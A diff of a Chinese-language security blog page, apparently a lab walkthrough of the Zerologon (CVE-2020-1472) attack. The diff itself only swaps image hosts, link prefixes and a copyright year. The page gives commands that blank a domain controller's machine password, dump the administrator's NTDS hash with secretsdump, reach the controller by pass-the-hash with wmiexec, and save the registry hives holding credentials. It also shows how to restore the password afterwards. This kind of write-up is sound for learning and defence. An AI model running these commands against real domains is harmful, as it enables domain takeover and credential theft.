@@ -225,7 +225,7 @@
 <h3 id="1-验证">1. 验证</h3>
 <p><a href="https://github.com/SecuraBV/CVE-2020-1472" target="_blank" rel="noopener">https://github.com/SecuraBV/CVE-2020-1472</a></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 zerologon_tester.py WIN-SJD97LJQLJP 192.168.40.132</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xgsbns8j21o406qmyn.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241431695.jpg" alt="img"></p>
 <h3 id="2-利用">2. 利用</h3>
 <p>整体利用流程：</p>
 <ol>
@@ -234,12 +234,12 @@
 <li>恢复域控机器用户密码</li>
 </ol>
 <h4 id="21-置空域控机器用户密码">2.1 置空域控机器用户密码</h4>
-<p><a href="https://github.com/dirkjanm/CVE-2020-1472" target="_blank" rel="noopener">CVE-2020-1472</a></p>
+<p><a href="https://i0.wp.com/github.com/dirkjanm/CVE-2020-1472" target="_blank" rel="noopener">CVE-2020-1472</a></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xgt07g1j21og0aytan.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241431754.jpg" alt="img"></p>
 <h4 id="22-导出ntds哈希">2.2 导出ntds哈希</h4>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 .\secretsdump.py spanning-tree.org/WIN-SJD97LJQLJP<span class="variable">$@WIN</span>-SJD97LJQLJP -dc-ip 192.168.40.132 -no-pass -just-dc-user administrator</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xgvvdk7j22q00ak41k.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241432603.jpg" alt="img"></p>
 <h4 id="23-恢复域控机器用户密码">2.3 恢复域控机器用户密码</h4>
 <p>在攻击过程中，我们将机器的密码置为空，这一步是会导致域控脱域的。所以我们需要及时恢复，我们将AD中的密码与注册表/lsass里面的密码保持一致。</p>
 <p>主要有三种方法：</p>
@@ -247,26 +247,26 @@
 <p>我们直接通过reg save命令 将注册表里面的信息拿回本地，然后通过secretsdump提取出里面的hash</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 .\wmiexec.py spanning-tree.org/administrator@192.168.40.132 -hashes aad3b435b51404eeaad3b435b51404ee:****</span><br></pre></td></tr></table></figure>
 <p>这里有个问题，如果域控下当前目录存在导出的凭据的话，在执行导出注册表的时候会一直卡住在命令执行阶段。</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xgylujej22to0o644g.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241432826.jpg" alt="img"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xgzqwqaj22wy0jogp6.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241432553.jpg" alt="img"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xh1qpykj22xc0qugvv.jpg" alt="img"></p>
-<p>使用<a href="https://github.com/dirkjanm/CVE-2020-1472" target="_blank" rel="noopener">CVE-2020-1472</a>下的restorepassword进行恢复</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241432790.jpg" alt="img"></p>
+<p>使用<a href="https://i0.wp.com/github.com/dirkjanm/CVE-2020-1472" target="_blank" rel="noopener">CVE-2020-1472</a>下的restorepassword进行恢复</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 .\restorepassword.py spanning-tree.org/WIN-SJD97LJQLJP@WIN-SJD97LJQLJP -target-ip 192.168.40.132 -hexpass ***</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xh6cjanj22xa08g429.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241432629.jpg" alt="img"></p>
 <p>再次尝试导出域哈希失败</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xha0rbdj22q005840e.jpg" alt="img"></p>
-<p>也可以使用<a href="https://github.com/risksense/zerologon" target="_blank" rel="noopener">risksense_zerologon</a>下的reinstall_original_pw.py来恢复，相当于重新进行一次攻击，计算密码的时候使用了空密码的hash去计算session_key。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241432356.jpg" alt="img"></p>
+<p>也可以使用<a href="https://i0.wp.com/github.com/risksense/zerologon" target="_blank" rel="noopener">risksense_zerologon</a>下的reinstall_original_pw.py来恢复，相当于重新进行一次攻击，计算密码的时候使用了空密码的hash去计算session_key。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 reinstall_original_pw.py WIN-SJD97LJQLJP 192.168.40.132 4f6d7e91463d3ea150e57b50fbbca2c2</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xhd9qx1j22xe0quajh.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241432879.jpg" alt="img"></p>
 <p><strong>从ntds.dict里面读取AD历史密码，然后恢复AD里面的密码</strong></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 .\secretsdump.py spanning-tree.org/WIN-SJD97LJQLJP<span class="variable">$@WIN</span>-SJD97LJQLJP -dc-ip 192.168.40.132 -no-pass -histoty</span><br></pre></td></tr></table></figure>
 <p>不太稳定，有时候会读不出来</p>
 <p><strong>重置计算机的机器帐户密码(包括AD，注册表，lsass里面的密码)</strong></p>
 <p>这里使用的是powershell 的cmdletReset-ComputerMachinePassword，是微软针对计算机脱域的情况下给出的一种解决方案。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 .\wmiexec.py spanning-tree.org/administrator@WIN-SJD97LJQLJP -hashes aad3b435b51404eeaad3b435b51404ee:**** -code GBK</span><br><span class="line"></span><br><span class="line">powershell Reset-ComputerMachinePassword</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h48xhhicg9j22ye0bmach.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241432302.jpg" alt="img"></p>
 
                 
 
@@ -460,7 +460,7 @@
 
                 </ul>
                 <p class="copyright text-muted">
-                    Copyright &copy; Kat 2022 
+                    Copyright &copy; Kat 2023 
                     <br>
                     <span style="display: inline-block; margin: 0 5px;">
                         <i class="fa fa-heart"></i>
